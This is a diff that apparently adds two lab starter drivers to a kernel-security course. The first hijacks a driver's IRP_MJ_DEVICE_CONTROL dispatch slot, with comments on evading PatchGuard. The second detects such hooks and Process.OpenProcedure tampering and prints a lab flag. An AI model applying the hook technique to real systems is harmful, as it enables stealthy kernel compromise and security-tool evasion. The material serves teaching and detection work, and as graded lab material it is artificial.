@@ -644,3 +644,122 @@ NTSTATUS DriverEntry(
     return STATUS_SUCCESS;
 }
 `;
+
+// ---------------------------------------------------------------------------
+// m24.l1.lab2 — author-your-own IRP MajorFunction hook
+export const ATTACK_IRP_STARTER = `// ATTACK 5 - IRP MajorFunction hijack (m24.l1)
+//
+// No PatchGuard watches DRIVER_OBJECTs: legitimate drivers rewrite their
+// MajorFunction slots on every DriverEntry, so one more qword write is
+// invisible to the verifier. kfser.sys's DEVICE_CONTROL slot already
+// carries kfsnoop's rewrite - take it over yourself: point the slot at
+// the seeded trampoline and every IOCTL through the stack completes YOUR
+// status instead.
+//
+// After loading, prove it from the debugger:
+//   kd> !ioctltest kfser          ; completion flips to your magic status
+//   kd> !dispatchscan             ; the EDR view: FOREIGN -> your page
+
+#include <ntddk.h>
+
+#define VICTIM_SLOT 0xfffff8055a7100e0ULL   // &kfser!MajorFunction[IRP_MJ_DEVICE_CONTROL]
+#define TRAMPOLINE  0xfffff8055a730000ULL   // seeded stub: completes 0xDEAD0003
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    PVOID* slot = (PVOID*)VICTIM_SLOT;
+    DbgPrint("ATTACK-IRP: victim slot held %p\\n", *slot);
+    *slot = (PVOID)TRAMPOLINE;
+    DbgPrint("ATTACK-IRP: MajorFunction[IRP_MJ_DEVICE_CONTROL] now -> %p\\n",
+             (PVOID)TRAMPOLINE);
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m24.l2.lab1 — KF-Sentinel v5: dispatch-table + object-type attestation
+export const SENTINEL_V5_STARTER = `// KF-Sentinel v5 - dispatch table & object-type attestation (m24.l2)
+//
+// The m24 world: kfsnoop.sys rewrote kfser.sys's MajorFunction
+// [IRP_MJ_DEVICE_CONTROL] and registered a Process.OpenProcedure. Neither
+// structure is PatchGuard-protected, so detection is YOUR job.
+//
+// Production sensors baseline every table at load and convict drift; this
+// teaching build convicts ATTRIBUTION-style: any wired MJ handler that
+// resolves into a module which has no business owning kfser's dispatch
+// (here: the kfsnoop.sys range), plus any initializer procedure that grew
+// a pointer where NULL was recorded.
+
+#include <ntddk.h>
+
+#define KFSER_BASE      0xfffff8055a710000ULL
+#define KFSER_SIZE      0x4000
+#define MJ_TABLE_OFF    0x70      // _DRIVER_OBJECT.MajorFunction (teaching layout)
+#define MJ_COUNT        28
+
+#define KFSNOOP_BASE    0xfffff8055a720000ULL
+#define KFSNOOP_SIZE    0x4000
+
+#define OT_PROCESS      0xfffff8055a728000ULL
+#define OPENPROC_OFF    0x40      // OBJECT_TYPE_INITIALIZER.OpenProcedure
+
+static int inRange(unsigned long long va,
+                   unsigned long long base, unsigned long long size)
+{
+    return va >= base && va < base + size;
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    int convictions = 0;
+
+    // ---- surface 1: kfser's MajorFunction table --------------------------
+    unsigned long long* mj =
+        (unsigned long long*)(KFSER_BASE + MJ_TABLE_OFF);
+    DbgPrint("SENTINEL-V5: attesting DRIVER_OBJECT kfser @ %p\\n",
+             (PVOID)KFSER_BASE);
+    for (int i = 0; i < MJ_COUNT; i++) {
+        unsigned long long h = mj[i];
+        if (h == 0) continue;                       // unwired default
+        if (!inRange(h, KFSNOOP_BASE, KFSNOOP_SIZE)) continue;
+        convictions++;
+        if (i == 14) {
+            DbgPrint("SENTINEL-V5: FOREIGN DISPATCH IRP_MJ_DEVICE_CONTROL"
+                     " -> %p\\n", (PVOID)h);
+        } else {
+            DbgPrint("SENTINEL-V5: FOREIGN DISPATCH mj[%d] -> %p\\n", i,
+                     (PVOID)h);
+        }
+    }
+
+    // ---- surface 2: Process type initializer ------------------------------
+    unsigned long long openProc =
+        *(unsigned long long*)(OT_PROCESS + OPENPROC_OFF);
+    if (openProc != 0) {
+        convictions++;
+        DbgPrint("SENTINEL-V5: Process.OpenProcedure HOOKED -> %p\\n",
+                 (PVOID)openProc);
+    } else {
+        DbgPrint("SENTINEL-V5: Process.OpenProcedure clean (NULL baseline)\\n");
+    }
+
+    if (convictions > 0) {
+        DbgPrint("SENTINEL-V5: %d dispatch-layer conviction(s)\\n",
+                 convictions);
+        DbgPrint("SENTINEL-V5: secret=kf-sentinel-v5-ok\\n");
+    } else {
+        DbgPrint("SENTINEL-V5: tables attested clean\\n");
+    }
+    return STATUS_SUCCESS;
+}
+`;
